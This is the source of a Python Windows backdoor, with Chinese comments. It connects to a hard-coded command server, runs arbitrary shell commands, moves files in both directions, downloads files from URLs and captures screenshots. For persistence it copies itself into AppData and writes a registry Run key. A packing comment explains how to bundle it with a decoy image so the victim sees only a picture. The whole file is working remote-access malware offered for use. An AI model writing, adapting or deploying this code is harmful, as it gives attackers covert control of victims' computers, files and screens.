from mss import mss
import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import requests
import ctypes

# 收发命令
def command_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def command_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024)
            return json.loads(json_data)
        except ValueError:
            print("BIU BIU BIU~~~")



# 连接
def connection():
    while True:
        # 断点续传
        time.sleep(20)
        try:
            # IP和端口
            sock.connect(("127.0.0.1",54321))
            shell()
        except:
            connection()

# 截图
def screenshot():
    with mss() as screenshot:
        screenshot.shot()

# 下载
def download(url):
    r = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(r.content)



# 命令
def shell():
    while True:
        command = command_recv()

        # 自定义的一些命令
        if command == "exit":
            break
        # 帮助
        elif command == "help":
            help_message = '''
            1. download: download
            2. upload: upload
            3. get <url>: download file from Internet
            4. start: run a program
            5. screenshot: screenshot
            '''
            command_send(help_message)
        # 跳目录
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        # 从网上下东西
        elif command[:3] == "get":
            try:
                download(command[4:])
                command_send("[+] -> Downloading file from Internet... ... ...")
            except:
                command_send("[*] => Download Failed, Fuck!!!")
        # 跑程序
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:],shell=True)
                command_send("[+] -> Yoo~")
            except:
                command_send("[*] => Run Failed, Fuck!!!")
        # 上传
        elif command[:6] == "upload":
            with open(command[7:],"wb") as upload_file:
                upload_message = command_recv()
                upload_file.write(base64.b64decode(upload_message))
        # 下载
        elif command[:8] == "download":
            with open(command[9:],"rb") as upload_file:
                command_send(base64.b64encode(upload_file.read()))
        # 截屏
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("screenshot.png","rb") as pic:
                    command_send(base64.b64encode(pic.read()))
                os.remove("screenshot.png")
            except:
                command_send("[*] => Screenshot Failed, Fuck!!!")
        else:
            try:
                prog = subprocess.Popen(command, shell=True, 
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    stdin = subprocess.PIPE)
                msg = prog.stdout.read() + prog.stderr.read()
                command_send(msg)
            except:
                command_send("[*] => Failed, Fuck!!!")



# 后门
location = os.environ['appdata'] + "\\Yoo.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU/Software/Microsoft/Windows/CurrentVersion/Run /v Yoo /t REG_SZ /d "'+location+'"',shell=True)

    # 支持图片shell: pyinstall --add-data "xiaohuangren.jpg;." --onefile --noconsole backdoor_win.py
    name = sys._MEIPASS + "/xiaohuangren.jpg"
    try:
        subprocess.Popen(name,shell=True)
    except:
        print("BIU BIU BIU~~~")

# 结束
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()